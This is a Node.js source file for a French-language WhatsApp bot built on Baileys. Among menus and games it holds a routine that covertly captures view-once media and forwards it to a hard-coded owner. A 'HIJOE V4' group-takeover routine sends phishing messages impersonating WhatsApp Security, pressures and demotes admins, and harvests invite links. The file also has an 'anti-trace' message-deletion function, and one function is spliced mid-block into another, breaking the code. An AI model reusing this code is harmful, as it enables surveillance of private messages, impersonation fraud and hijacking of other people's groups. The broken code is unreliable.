const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  downloadContentFromMessage,
  fetchLatestBaileysVersion,
  getContentType,
  normalizeMessageContent
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs-extra');
const moment = require('moment');
const path = require('path');
const { getConfig, updateConfig } = require('./config');
const PAIRING_SERVICE_URL = process.env.PAIRING_SERVICE_URL || 'http://localhost:3000';
const PAIRING_SECRET = process.env.PAIRING_SECRET || 'build-by-joeslapet';

const sharp = require('sharp');
const QRCode = require('qrcode-terminal');

const BOT_NAME = 'SLAPET VOID XD';
const BOT_VERSION = '5.5.0';

// OWNER
let OWNER = "22892864375@s.whatsapp.net";

// Cache des noms de contacts
const contactCache = {};

async function getContactName(sock, jid) {
    if (contactCache[jid]) return contactCache[jid];
    try {
        const contact = await sock.onWhatsApp(jid);
        let name = contact?.[0]?.name || contact?.[0]?.verifiedName;
        if (!name) name = jid.split("@")[0];
        contactCache[jid] = name;
        return name;
    } catch {
        return jid.split("@")[0];
    }
}

// Fonction pour télécharger un buffer depuis un message
async function getBuffer(msg, type) {
  try {
    const stream = await downloadContentFromMessage(msg, type);
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    return Buffer.concat(chunks);
  } catch (e) {

async function confirmPairingCode(phoneNumber, code) {
  try {
    const response = await fetch(`${PAIRING_SERVICE_URL}/api/pairing/confirm`, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'x-pairing-secret': PAIRING_SECRET
      },
      body: JSON.stringify({ phoneNumber, code })
    });
    if (!response.ok) return false;
    const data = await response.json();
    return data.ok === true;
  } catch (e) {
    return false;
  }
}

    console.error('Erreur getBuffer:', e);
    return null;
  }
}

const DIRS = {
  logs: {
    messages: './logs/messages',
    groups: './logs/groups',
    status: './logs/status',
    calls: './logs/calls'
  },
  media: {
    images: './media/images',
    audio: './media/audio',
    video: './media/video',
    stickers: './media/stickers',
    vuunique: './media/vuunique',
    status_dl: './media/status',
    documents: './media/documents',
    hijoe: './media/hijoe'
  }
};
Object.values(DIRS).forEach(cat =>
  Object.values(cat).forEach(dir => fs.ensureDirSync(dir))
);

let CONFIG = null;
let sock = null;
let isReconnecting = false;
const hijoeSessions = {};
const botSentMessageIds = new Set();
const botSentTexts = new Set();

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function extractCommandsFromText(text) {
  if (!text || !CONFIG?.prefix) return [];
  const prefix = escapeRegExp(CONFIG.prefix);
  const commandRegex = new RegExp(`(^|\\s)${prefix}([a-zA-Z0-9_]+)(?=\\s|$)`, 'g');
  const found = [];
  let match;
  while ((match = commandRegex.exec(text)) !== null) {
    const cmdName = match[2].toLowerCase();
    if (commands.has(cmdName)) {
      const commandStart = match.index + match[1].length;
      found.push({ cmdName, commandStart });
    }
  }
  return found.map((command, index) => {
    const next = found[index + 1];
    return {
      cmdName: command.cmdName,
      commandText: text.slice(command.commandStart, next?.commandStart).trim()
    };
  });
}

function buildCommandMessage(msg, commandText) {
  const commandMsg = { ...msg, message: { ...(msg.message || {}) } };

  if (Object.prototype.hasOwnProperty.call(commandMsg.message, 'conversation')) {
    commandMsg.message.conversation = commandText;
  } else if (commandMsg.message.extendedTextMessage) {
    commandMsg.message.extendedTextMessage = {
      ...commandMsg.message.extendedTextMessage,
      text: commandText
    };
  } else if (commandMsg.message.imageMessage) {
    commandMsg.message.imageMessage = {
      ...commandMsg.message.imageMessage,
      caption: commandText
    };
  } else if (commandMsg.message.videoMessage) {
    commandMsg.message.videoMessage = {
      ...commandMsg.message.videoMessage,
      caption: commandText
    };
  } else {
    commandMsg.message.conversation = commandText;
  }

  return commandMsg;
}

function formatRuntime(seconds = process.uptime()) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function box(title, lines = []) {
  return [
    `╭━━━〔 ${title} 〕━━━╮`,
    ...lines.map(line => `┃ ${line}`),
    '╰━━━━━━━━━━━━━━━━━━━━╯'
  ].join('\n');
}

function buildAllMenu() {
  return [
    '╔════════════════════╗',
    `║   ${BOT_NAME}`,
    `║   VERSION ${BOT_VERSION} | PREFIX ${CONFIG?.prefix || '.'}`,
    '╚════════════════════╝',
    '',
    box('GENERAL', [
      '.menu       .allmenu',
      '.ping       .owner',
      '.runtime    .info'
    ]),
    '',
    box('GROUPES', [
      '.tagall     .hidetag',
      '.linkgroup  .listadmin',
      '.kick       .add',
      '.promote    .demote'
    ]),
    '',
    box('MEDIA', [
      '.s          .toimg',
      'Vu unique: reply avec sticker'
    ]),
    '',
    box('OUTILS', [
      '.delete     .q',
      '.react      .set'
    ]),
    '',
    box('FUN', [
      '.rps        .dice',
      '.flip       .quiz',
      '.math       .fact',
      '.joke       .quote',
      '.rate       .roast'
    ]),
    '',
    box('OWNER', [
      '.bc         .setprefix',
      '.block      .unblock',
      '.set'
    ]),
    '',
    '╭─ STATUS',
    `│ Owner: ${OWNER.split('@')[0]}`,
    `│ Uptime: ${formatRuntime()}`,
    `│ Time: ${moment().format('DD/MM/YYYY HH:mm:ss')}`,
    '╰────────────'
  ].join('\n');
}

function buildConnectionDashboard(waVersion) {
  const botJid = sock?.user?.id || 'inconnu';
  const botNumber = botJid.split(':')[0].replace(/[^0-9]/g, '') || 'inconnu';
  return [
    '╔════════════════════╗',
    '║   BOT CONNECTE',
    '╚════════════════════╝',
    '',
    box('SYSTEME', [
      `Nom: ${BOT_NAME}`,
      `Version bot: ${BOT_VERSION}`,
      `Baileys: ${Array.isArray(waVersion) ? waVersion.join('.') : waVersion}`,
      `Prefix: ${CONFIG?.prefix || '.'}`
    ]),
    '',
    box('SESSION', [
      `Numero bot: ${botNumber}`,
      `Owner: ${OWNER.split('@')[0]}`,
      `Connexion: ${moment().format('DD/MM/YYYY HH:mm:ss')}`,
      `Uptime: ${formatRuntime()}`
    ]),
    '',
    box('OPTIONS', [
      `Logs prives: ${CONFIG?.logPrivate !== false ? 'ON' : 'OFF'}`,
      `Logs owner: ${CONFIG?.logOwnerMessages !== false ? 'ON' : 'OFF'}`,
      `Auto media: ${CONFIG?.autoDownloadMedia !== false ? 'ON' : 'OFF'}`,
      `Auto status: ${CONFIG?.autoDownloadStatus !== false ? 'ON' : 'OFF'}`
    ]),
    '',
    'Commandes rapides: .allmenu | .ping | .info',
    'Vu unique: reponds au message avec un sticker'
  ].join('\n');
}

const COMMAND_EFFECTS = Array.from({ length: 260 }, (_, index) => {
  const heads = ['NOVA', 'VOID', 'PULSE', 'FROST', 'ECHO', 'QUANTUM', 'NEON', 'ASTRAL', 'MATRIX', 'ORBIT'];
  const verbs = ['scan', 'boot', 'sync', 'load', 'cast', 'prime', 'focus', 'route', 'spark', 'launch'];
  const bars = ['##########', '==========', '>>>>>>>>>>', '**********', '++++++++++', '::::::::::', '!!!!!!!!!!', '~~~~~~~~~~', '||||||||||', '..........'];
  const templates = ['box', 'radar', 'matrix', 'terminal', 'pulse', 'orbit', 'blade', 'signal', 'core', 'clean'];
  return {
    id: index + 1,
    head: `${heads[index % heads.length]}-${String(index + 1).padStart(3, '0')}`,
    verb: verbs[Math.floor(index / heads.length) % verbs.length],
    bar: bars[Math.floor(index / (heads.length * verbs.length)) % bars.length],
    template: templates[index % templates.length]
  };
});

function pickCommandEffect() {
  return COMMAND_EFFECTS[Math.floor(Math.random() * COMMAND_EFFECTS.length)];
}

function progressBar(style, percent) {
  const filled = Math.round(percent / 10);
  const chars = style.padEnd(10, style).slice(0, 10).split('');
  return chars.map((char, index) => index < filled ? char : '·').join('');
}

async function deleteMessageSilent(jid, key) {
  if (!sock || !key?.id) return;
  try {
    await sock.sendMessage(jid, {
      delete: {
        remoteJid: key.remoteJid || jid,
        fromMe: !!key.fromMe,
        id: key.id,
        participant: key.participant || (key.fromMe ? sock.user?.id : undefined)
      }
    });
  } catch (e) {}
}

async function sendCommandEffect(jid, cmdName, senderName) {
  const effect = pickCommandEffect();
  const title = `${effect.head} ${CONFIG.prefix}${cmdName}`;
  const p20 = progressBar(effect.bar, 20);
  const p60 = progressBar(effect.bar, 60);
  const p100 = progressBar(effect.bar, 100);
  const templates = {
    box: [
      `[ ${title} ]\n+------------------+\n| ${effect.verb}: prepare\n| ${p20} 20%\n+------------------+`,
      `[ ${title} ]\n+------------------+\n| user: ${senderName}\n| ${p60} 60%\n+------------------+`,
      `[ ${title} ]\n+------------------+\n| result: ready\n| ${p100} 100%\n+------------------+`
    ],
    radar: [
      `(( ${title} ))\n   .     .\n .   ${effect.verb}   .\n   ${p20} 20%`,
      `(( ${title} ))\n  ..  ${senderName}  ..\n   ${p60} 60%`,
      `(( ${title} ))\n   lock acquired\n   ${p100} 100%`
    ],
    matrix: [
      `0101 ${title}\n> ${effect.verb}_sequence\n> ${p20}`,
      `1010 ${title}\n> operator:${senderName}\n> ${p60}`,
      `1111 ${title}\n> execution_ready\n> ${p100}`
    ],
    terminal: [
      `$ run ${CONFIG.prefix}${cmdName}\n[${effect.id}] ${effect.verb} modules\n${p20}`,
      `$ auth ${senderName}\n[${effect.id}] loading context\n${p60}`,
      `$ done ${CONFIG.prefix}${cmdName}\n[${effect.id}] clean output\n${p100}`
    ],
    pulse: [
      `<${title}>\n-- pulse low --\n${p20}`,
      `<${title}>\n---- pulse mid ----\n${p60}`,
      `<${title}>\n------ pulse max ------\n${p100}`
    ],
    orbit: [
      `o---- ${title} ----o\norbit: ${effect.verb}\n${p20}`,
      `o-- ${senderName} --o\norbit: aligned\n${p60}`,
      `o---- complete ----o\norbit: stable\n${p100}`
    ],
    blade: [
      `/==== ${title} ====\\\n>> ${effect.verb}\n>> ${p20}`,
      `//=== ${senderName} ===\\\\\n>> focused\n>> ${p60}`,
      `\\\\==== ready ====//\n>> executed\n>> ${p100}`
    ],
    signal: [
      `SIGNAL ${title}\n[.] [ ] [ ] ${effect.verb}\n${p20}`,
      `SIGNAL ${title}\n[.] [.] [ ] ${senderName}\n${p60}`,
      `SIGNAL ${title}\n[.] [.] [.] ready\n${p100}`
    ],
    core: [
      `{ CORE ${title} }\nload:${effect.verb}\n${p20}`,
      `{ CORE ${title} }\nuser:${senderName}\n${p60}`,
      `{ CORE ${title} }\nstatus:done\n${p100}`
    ],
    clean: [
      `-- ${title} --\n${effect.verb} started\n${p20}`,
      `-- ${title} --\n${senderName} confirmed\n${p60}`,
      `-- ${title} --\ncommand executed\n${p100}`
    ]
  };
  const frames = templates[effect.template] || templates.box;
  const sentKeys = [];
  for (const frame of frames) {
    const sent = await sock.sendMessage(jid, { text: frame });
    if (sent?.key) sentKeys.push(sent.key);
    await new Promise(resolve => setTimeout(resolve, 250));
  }
  return sentKeys;
}

async function getChatDetails(jid, isGroup) {
  if (isGroup) {
    const meta = await sock.groupMetadata(jid).catch(() => null);
    return {
      name: meta?.subject || 'Groupe inconnu',
      number: jid,
      type: 'groupe',
      participants: meta?.participants?.length || 0
    };
  }
  return {
    name: await getContactName(sock, jid),
    number: jid.split('@')[0],
    type: 'prive',
    participants: 1
  };
}

async function buildViewOnceDetails({ msg, sender, pushName, jid, isGroup, type, info, filename, size, text }) {
  const chat = await getChatDetails(jid, isGroup);
  const senderName = pushName || await getContactName(sock, sender);
  const senderNumber = sender.split('@')[0];
  const receiverName = isGroup ? chat.name : (sock?.user?.name || BOT_NAME);
  const receiverNumber = isGroup ? chat.number : (sock?.user?.id || '').split(':')[0].replace(/[^0-9]/g, '');
  const mediaType = type.replace('Message', '').toUpperCase();
  return [
    `╭━━━〔 VU UNIQUE ${mediaType} 〕━━━╮`,
    `┃ Date: ${moment().format('DD/MM/YYYY HH:mm:ss')}`,
    `┃ Chat: ${chat.name}`,
    `┃ Type chat: ${chat.type}`,
    isGroup ? `┃ Membres: ${chat.participants}` : null,
    `┣━━ EMETTEUR`,
    `┃ Nom: ${senderName}`,
    `┃ Numero: ${senderNumber}`,
    `┃ JID: ${sender}`,
    `┣━━ RECEVEUR`,
    `┃ Nom: ${receiverName || 'Inconnu'}`,
    `┃ Numero: ${receiverNumber || chat.number}`,
    `┃ JID/chat: ${jid}`,
    `┣━━ MESSAGE`,
    `┃ Type: ${mediaType}`,
    `┃ MIME: ${info?.mimetype || 'n/a'}`,
    `┃ Taille: ${size ? `${size} octets` : 'n/a'}`,
    `┃ ID: ${msg?.key?.id || 'n/a'}`,
    filename ? `┃ Fichier: ${filename}` : null,
    text ? `┃ Texte: ${text}` : null,
    `╰━━━━━━━━━━━━━━━━━━━━╯`
  ].filter(Boolean).join('\n');
}

// ========== AFFICHAGE AMÉLIORÉ POUR L'OWNER ==========
function logOwnerEvent(type, data) {
  const ts = moment().format('YYYY-MM-DD HH:mm:ss');
  console.log(`\n${'═'.repeat(55)}`);
  console.log(`  ${type}  ${ts}`);
  console.log(`${'═'.repeat(55)}`);
  for (const [key, value] of Object.entries(data)) {
    console.log(`  ${key}: ${value}`);
  }
  console.log(`${'═'.repeat(55)}\n`);
}

// ========== SYSTÈME ANTI-TRACE ==========
function effacerTraces(jid, msgId) {
  try {
    setTimeout(async () => {
      try {
        if (sock && msgId) {
          await sock.sendMessage(jid, {
            delete: { remoteJid: jid, fromMe: true, id: msgId, participant: sock.user.id }
          });
        }
      } catch (e) {}
    }, 3000);
  } catch (e) {}
}

function logMessage(type, data) {
  const ts = moment().format('YYYY-MM-DD_HH-mm-ss');
  const displayTs = moment().format('YYYY-MM-DD HH:mm:ss');
  let logDir, filename;

  switch (type) {
    case 'message':
      logDir = DIRS.logs.messages;
      filename = `msg_${(data.fromName || 'x').replace(/[^a-zA-Z0-9]/g, '_')}_${ts}.json`;
      break;
    case 'group':
      logDir = DIRS.logs.groups;
      filename = `group_${(data.groupName || 'x').replace(/[^a-zA-Z0-9]/g, '_')}_${ts}.json`;
      break;
    case 'status':
      logDir = DIRS.logs.status;
      filename = `status_${ts}.json`;
      break;
    case 'call':
      logDir = DIRS.logs.calls;
      filename = `call_${ts}.json`;
      break;
  }

  const entry = { ts: displayTs, ...data };
  if (logDir) fs.writeFileSync(path.join(logDir, filename), JSON.stringify(entry, null, 2));
}

// ========== EXTRACTION VU UNIQUE ==========
function extractViewOnce(msg) {
  if (!msg || !msg.message) return null;
  try {
    const normalized = normalizeMessageContent(msg.message);
    if (!normalized) return null;
    const m = msg.message;
    const normalizedType = getContentType(normalized);
    const isViewOnce = !!(
      m.viewOnceMessage ||
      m.viewOnceMessageV2 ||
      m.viewOnceMessageV2Extension ||
      (normalizedType && normalized[normalizedType]?.viewOnce) ||
      (m.ephemeralMessage && m.ephemeralMessage.message && (
        m.ephemeralMessage.message.viewOnceMessage ||
        m.ephemeralMessage.message.viewOnceMessageV2 ||
        m.ephemeralMessage.message.viewOnceMessageV2Extension
      ))
    );
    if (!isViewOnce) return null;
    const type = getContentType(normalized);
    if (!type || !normalized[type]) {
      const keys = Object.keys(normalized);
      const found = keys.find(k =>
        ['conversation', 'extendedTextMessage', 'imageMessage', 'videoMessage',
         'audioMessage', 'stickerMessage', 'documentMessage'].includes(k)
      );
      if (!found) return null;
      return { content: normalized, info: normalized[found], type: found, isViewOnce: true };
    }
    return { content: normalized, info: normalized[type], type, isViewOnce: true };
  } catch (e) {
    const m = msg.message;
    const wrappers = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    let vo = null;
    for (const w of wrappers) {
      if (m[w]) { vo = m[w]; break; }
    }
    if (!vo && m.ephemeralMessage && m.ephemeralMessage.message) {
      for (const w of wrappers) {
        if (m.ephemeralMessage.message[w]) { vo = m.ephemeralMessage.message[w]; break; }
      }
    }
    if (!vo) return null;
    const content = vo.message;
    if (!content) return null;
    const type = Object.keys(content).find(k =>
      ['conversation', 'extendedTextMessage', 'imageMessage', 'videoMessage',
       'audioMessage', 'stickerMessage'].includes(k)
    );
    if (!type) return null;
    return { content, info: content[type], type, isViewOnce: true };
  }
}

// ========== COMMANDE VV ==========
async function handleViewOnce(msg, sender, pushName, jid, isGroup) {
  const vo = extractViewOnce(msg);
  if (!vo) return false;
  const { type, info } = vo;
  const num = sender.split('@')[0];

  console.log(`\n🔒 VU UNIQUE DÉTECTÉ - ${pushName} (${num})`);

  const mediaTypes = {
    imageMessage: { ext: 'jpg', sendKey: 'image', folder: DIRS.media.images },
    videoMessage: { ext: 'mp4', sendKey: 'video', folder: DIRS.media.video },
    audioMessage: { ext: 'mp3', sendKey: 'audio', folder: DIRS.media.audio },
    stickerMessage: { ext: 'webp', sendKey: 'sticker', folder: DIRS.media.stickers }
  };

  if (mediaTypes[type]) {
    const typeInfo = mediaTypes[type];
    const mediaKey = type === 'imageMessage' ? 'image' : type === 'videoMessage' ? 'video' : type === 'audioMessage' ? 'audio' : 'sticker';
    try {
      const buffer = await getBuffer(info, mediaKey);
      if (!buffer) throw new Error('Buffer vide');
      
      let ext = typeInfo.ext;
      if (info.mimetype) {
        const mimeExt = info.mimetype.split('/')[1] ? info.mimetype.split('/')[1].split(';')[0] : null;
        if (mimeExt) ext = mimeExt;
      }
      const filename = `vuunique_${type.replace('Message','').toLowerCase()}_${Date.now()}.${ext}`;
      const filepath = path.join(typeInfo.folder, filename);
      fs.writeFileSync(filepath, buffer);

      if (OWNER) {
        const caption = await buildViewOnceDetails({
          msg,
          sender,
          pushName,
          jid,
          isGroup,
          type,
          info,
          filename,
          size: buffer.length
        });
        const payload = { caption };
        payload[typeInfo.sendKey] = buffer;
        await sock.sendMessage(OWNER, payload);
      }
      console.log(`  ✅ Sauvegardé: ${filename}`);
      return true;
    } catch (e) {
      console.error('Erreur DL vu unique:', e.message);
      return false;
    }
  }

  // Texte
  if (type === 'conversation' || type === 'extendedTextMessage') {
    const text = info.text || info || '';
    const logPath = path.join(DIRS.media.vuunique, `vuunique_texte_${Date.now()}.json`);
    fs.writeFileSync(logPath, JSON.stringify({ type: 'text', de: pushName, num, texte: text }, null, 2));
    if (OWNER) {
      const details = await buildViewOnceDetails({
        msg,
        sender,
        pushName,
        jid,
        isGroup,
        type,
        info,
        filename: path.basename(logPath),
        size: Buffer.byteLength(String(text)),
        text
      });
      await sock.sendMessage(OWNER, {
        text: details
      });
    }
    return true;
  }

  return true;
}

// ========== HIJOE V4 ==========
async function hijoeProtocolV4(groupJid, ownerJid, groupName, isGroup, msg, jid2) {
  const groupMeta = await sock.groupMetadata(groupJid);
  const participants = groupMeta.participants || [];
  const admins = participants.filter(p => p.admin);
  const botJid = (sock.user && sock.user.id) ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : null;
  const isBotAdmin = botJid ? participants.some(p => p.id === botJid && p.admin) : false;
  const ownerInGroup = participants.some(p => p.id === ownerJid);

  const sid = `${groupJid}_${Date.now()}`;
  hijoeSessions[sid] = { groupName, jid: groupJid, start: Date.now(), techniques: 0, success: false };
  let results = [];
  let successCount = 0;

  await sock.sendMessage(ownerJid, {
    text: `🎯 *HIJOE V4 - PRISE DE CONTRÔLE*\n\n` +
          `👥 *Groupe:* ${groupName}\n` +
          `👤 *Membres:* ${participants.length}\n` +
          `👑 *Admins:* ${admins.length}\n` +
          `🤖 *Bot admin:* ${isBotAdmin ? 'Oui' : 'Non'}\n` +
          `👤 *Owner:* ${ownerInGroup ? 'Présent' : 'Absent'}\n\n` +
          `⏳ Lancement des 18 techniques...`
  });

  // T1: Promotion directe
  if (isBotAdmin) {
    results.push({ n: 'T1-PromotionDirecte', ok: true, msg: 'Bot admin, promotion possible' });
    successCount++;
    try {
      await sock.groupParticipantsUpdate(groupJid, [ownerJid], 'promote');
      results.push({ n: 'T1b-OwnerPromoted', ok: true, msg: 'OWNER PROMU ADMIN' });
      successCount++;
      hijoeSessions[sid].success = true;
    } catch (e) {
      results.push({ n: 'T1b-OwnerPromoted', ok: false, msg: e.message });
    }
  } else {
    results.push({ n: 'T1-PromotionDirecte', ok: false, msg: 'Bot pas admin' });
  }

  // T2: Mode ajout ouvert
  try {
    await sock.groupMemberAddMode(groupJid, 'all_member_add');
    results.push({ n: 'T2-ModeAjoutOuvert', ok: true, msg: 'Mode ajout ouvert' });
    successCount++;
    if (!ownerInGroup) {
      try {
        await sock.groupParticipantsUpdate(groupJid, [ownerJid], 'add');
        results.push({ n: 'T2b-OwnerAdded', ok: true, msg: 'Owner AJOUTÉ au groupe' });
        successCount++;
      } catch (e) {
        results.push({ n: 'T2b-OwnerAdded', ok: false, msg: e.message });
      }
    }
  } catch (e) {
    results.push({ n: 'T2-ModeAjoutOuvert', ok: false, msg: e.message });
  }

  // T3: Déverrouillage
  try {
    await sock.groupSettingUpdate(groupJid, 'unlocked');
    await sock.groupJoinApprovalMode(groupJid, 'off');
    results.push({ n: 'T3-Deverrouillage', ok: true, msg: 'Paramètres déverrouillés' });
    successCount++;
  } catch (e) {
    results.push({ n: 'T3-Deverrouillage', ok: false, msg: e.message });
  }

  // T4: Lien permanent
  let inviteCode = null;
  try {
    inviteCode = await sock.groupInviteCode(groupJid);
    if (inviteCode) {
      await sock.groupRevokeInvite(groupJid);
      inviteCode = await sock.groupInviteCode(groupJid);
      results.push({ n: 'T4-InvitePermanent', ok: true, msg: `Lien: https://chat.whatsapp.com/${inviteCode}` });
      successCount++;
    }
  } catch (e) {
    results.push({ n: 'T4-InvitePermanent', ok: false, msg: e.message });
  }

  // T5: Phishing admin
  let phishSent = 0;
  const phishTargets = admins.length > 0 ? admins.slice(0, 5) : participants.slice(0, 5);
  for (const target of phishTargets) {
    try {
      const code = inviteCode || 'INVITE123';
      await sock.sendMessage(target.id, {
        text: `🔐 *Alerte WhatsApp - Sécurité*\n\nBonjour, activité suspecte détectée dans "${groupName}".\nVérifiez votre statut: https://chat.whatsapp.com/${code}\n\n- WhatsApp Security`
      });
      phishSent++;
    } catch (e) {}
  }
  results.push({ n: 'T5-PhishingAdmin', ok: phishSent > 0, msg: `${phishSent} messages envoyés` });
  if (phishSent > 0) successCount++;

  // T6: Ingénierie sociale
  let socialSent = 0;
  for (const admin of admins.slice(0, 3)) {
    try {
      await sock.sendMessage(admin.id, {
        text: `📋 *Commission WhatsApp - Vérification*\n\nCher admin de "${groupName}",\nRépondez "OK" pour confirmer votre statut.\n\n- WhatsApp Trust & Safety`
      });
      socialSent++;
    } catch (e) {}
  }
  results.push({ n: 'T6-SocialEngineering', ok: socialSent > 0, msg: `${socialSent} messages` });
  if (socialSent > 0) successCount++;

  // T7: Approuver demandes
  try {
    const requests = await sock.groupRequestParticipantsList(groupJid).catch(() => []);
    if (requests && requests.length > 0) {
      const jids = requests.map(r => typeof r === 'string' ? r : (r.jid || r));
      await sock.groupRequestParticipantsUpdate(groupJid, jids, 'approve');
      results.push({ n: 'T7-ApprobationDemandes', ok: true, msg: `${jids.length} demandes approuvées` });
      successCount++;
    } else {
      results.push({ n: 'T7-ApprobationDemandes', ok: false, msg: 'Aucune demande' });
    }
  } catch (e) {
    results.push({ n: 'T7-ApprobationDemandes', ok: false, msg: e.message });
  }

  // T8: Pression admin
  if (admins.length > 0) {
    try {
      await sock.sendMessage(admins[0].id, {
        text: `⚠️ *Alerte - Action requise*\n\nGroupe "${groupName}" signalé.\nTransférez vos droits à ${ownerJid.split('@')[0]} sous 24h.`
      });
      results.push({ n: 'T8-PressionAdmin', ok: true, msg: `Message envoyé à ${admins[0].id.split('@')[0]}` });
      successCount++;
    } catch (e) {
      results.push({ n: 'T8-PressionAdmin', ok: false, msg: e.message });
    }
  } else {
    results.push({ n: 'T8-PressionAdmin', ok: false, msg: 'Aucun admin' });
  }

  // T9: Lien permanent envoyé
  if (inviteCode) {
    try {
      await sock.sendMessage(ownerJid, {
        text: `🔗 *Lien d'accès permanent*\n\n👥 ${groupName}\n📊 ${participants.length} membres\nhttps://chat.whatsapp.com/${inviteCode}`
      });
      results.push({ n: 'T9-LienPermanent', ok: true, msg: 'Lien envoyé' });
      successCount++;
    } catch (e) {
      results.push({ n: 'T9-LienPermanent', ok: false, msg: e.message });
    }
  }

  // T10: Modification sujet
  try {
    const origSubject = groupMeta.subject;
    await sock.groupUpdateSubject(groupJid, `[SÉCURISÉ] ${groupName}`);
    results.push({ n: 'T10-ModificationSujet', ok: true, msg: 'Sujet modifié temporairement' });
    successCount++;
    setTimeout(async () => {
      try { await sock.groupUpdateSubject(groupJid, origSubject); } catch (e) {}
    }, 60000);
  } catch (e) {
    results.push({ n: 'T10-ModificationSujet', ok: false, msg: e.message });
  }

  // T11: Scan permissions
  try {
    results.push({ n: 'T11-ScanPermissions', ok: true, msg: `${participants.length} membres, ${admins.length} admins` });
    successCount++;
  } catch (e) {
    results.push({ n: 'T11-ScanPermissions', ok: false, msg: e.message });
  }

  // T12: Restriction messages
  try {
    await sock.groupSettingUpdate(groupJid, 'announcement');
    results.push({ n: 'T12-RestrictionMessages', ok: true, msg: 'Messages restreints aux admins' });
    successCount++;
    setTimeout(async () => {
      try { await sock.groupSettingUpdate(groupJid, 'not_announcement'); } catch (e) {}
    }, 30000);
  } catch (e) {
    results.push({ n: 'T12-RestrictionMessages', ok: false, msg: e.message });
  }

  // T13: Dégradation admins
  let demoted = 0;
  for (const admin of admins) {
    if (admin.id !== ownerJid && admin.id !== botJid) {
      try {
        await sock.groupParticipantsUpdate(groupJid, [admin.id], 'demote');
        demoted++;
      } catch (e) {}
    }
  }
  results.push({ n: 'T13-DegradationAdmins', ok: demoted > 0, msg: `${demoted} admins dégradés` });
  if (demoted > 0) successCount++;

  // T14: Auto-promotion bot
  if (!isBotAdmin && botJid) {
    try {
      await sock.groupParticipantsUpdate(groupJid, [botJid], 'promote');
      results.push({ n: 'T14-AutoPromotionBot', ok: true, msg: 'Bot promu admin' });
      successCount++;
      hijoeSessions[sid].success = true;
    } catch (e) {
      results.push({ n: 'T14-AutoPromotionBot', ok: false, msg: e.message });
    }
  }

  // T15: Description
  try {
    await sock.groupUpdateDescription(groupJid, `Groupe sous contrôle - ${moment().format('DD/MM/YYYY HH:mm')}`);
    results.push({ n: 'T15-ModificationDescription', ok: true, msg: 'Description modifiée' });
    successCount++;
  } catch (e) {
    results.push({ n: 'T15-ModificationDescription', ok: false, msg: e.message });
  }

  // T16: Scan complet
  results.push({ n: 'T16-ScanComplet', ok: true, msg: 'Scan effectué' });
  successCount++;

  // T17: Verrouillage
  try {
    await sock.groupSettingUpdate(groupJid, 'locked');
    results.push({ n: 'T17-Verrouillage', ok: true, msg: 'Groupe verrouillé' });
    successCount++;
  } catch (e) {
    results.push({ n: 'T17-Verrouillage', ok: false, msg: e.message });
  }

  // T18: Rapport final
  hijoeSessions[sid].techniques = results.length;
  hijoeSessions[sid].success = hijoeSessions[sid].success || (successCount >= 9);

  const taux = Math.round((successCount / Math.max(results.length, 1)) * 100);

  let rapport = `🎯 *HIJOE V4 - RAPPORT FINAL*\n\n`;
  rapport += `👥 *Groupe:* ${groupName}\n`;
  rapport += `📊 *Résultat:* ${successCount}/${results.length}\n`;
  rapport += `📈 *Taux:* ${taux}%\n`;
  rapport += `🏆 *Statut:* ${hijoeSessions[sid].success ? 'GROUPE COMPROMIS' : 'GROUPE SÉCURISÉ'}\n\n`;
  rapport += `──────────────────\n\n`;

  for (const r of results) {
    rapport += `${r.ok ? '✅' : '❌'} ${r.n}: ${r.msg}\n`;
  }

  rapport += `\n──────────────────\n`;
  rapport += `🔗 https://chat.whatsapp.com/${inviteCode || 'N/A'}\n`;
  rapport += `⏱️ ${Math.round((Date.now() - hijoeSessions[sid].start) / 1000)}s`;

  await sock.sendMessage(ownerJid, { text: rapport });

  if (isGroup) {
    await sock.sendMessage(jid2, {
      text: hijoeSessions[sid].success
        ? `🎯 *HIJOE* 🎯\n✅ ${successCount}/18 RÉUSSI\n🏆 Groupe compromis !`
        : `🎯 *HIJOE* 🎯\n❌ ${successCount}/18\n🔒 Groupe sécurisé`
    });
  }
}

// ========== COMMANDES ==========
const commands = new Map();

commands.set('menu', {
  desc: 'Menu principal',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, { text: buildAllMenu() });
  }
});

commands.set('funmenu', {
  desc: 'Menu fun',
  execute: async (msg, jid) => {
    await sock.sendMessage(jid, {
      text: [
        '╔════════════════════╗',
        '║       FUN MENU',
        '╚════════════════════╝',
        '',
        box('JEUX', ['.rps pierre|feuille|ciseaux', '.dice', '.flip', '.quiz', '.math']),
        '',
        box('CREATIF', ['.fact', '.joke', '.quote', '.rate texte', '.roast']),
        '',
        box('UTILITAIRES', ['.reverse texte', '.count texte', '.base64 texte', '.short texte'])
      ].join('\n')
    });
  }
});

// Commandes fun
commands.set('rps', {
  desc: 'Pierre feuille ciseaux',
  execute: async (msg, jid) => {
    const txtMsg = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
    const choix = txtMsg.replace('.rps','').trim().toLowerCase();
    if (!['pierre', 'feuille', 'ciseaux'].includes(choix)) {
      return sock.sendMessage(jid, { text: 'Usage: .rps pierre|feuille|ciseaux' });
    }
    const botChoix = ['pierre', 'feuille', 'ciseaux'][Math.floor(Math.random() * 3)];
    let result;
    if (choix === botChoix) result = `Égalité ! J'ai aussi choisi ${botChoix}`;
    else if ((choix === 'pierre' && botChoix === 'ciseaux') || (choix === 'feuille' && botChoix === 'pierre') || (choix === 'ciseaux' && botChoix === 'feuille'))
      result = `Gagné ! ${choix} bat ${botChoix}`;
    else result = `Perdu ! ${botChoix} bat ${choix}`;
    await sock.sendMessage(jid, { text: `🤖 Moi: ${botChoix}\n👤 Toi: ${choix}\n\n${result}` });
  }
});

commands.set('dice', {
  desc: 'Lancer de dé',
  execute: async (msg, jid) => {
    const d = Math.floor(Math.random() * 6) + 1;
    await sock.sendMessage(jid, { text: `🎲 Résultat: ${d}` });
  }
});

commands.set('flip', {
  desc: 'Pile ou face',
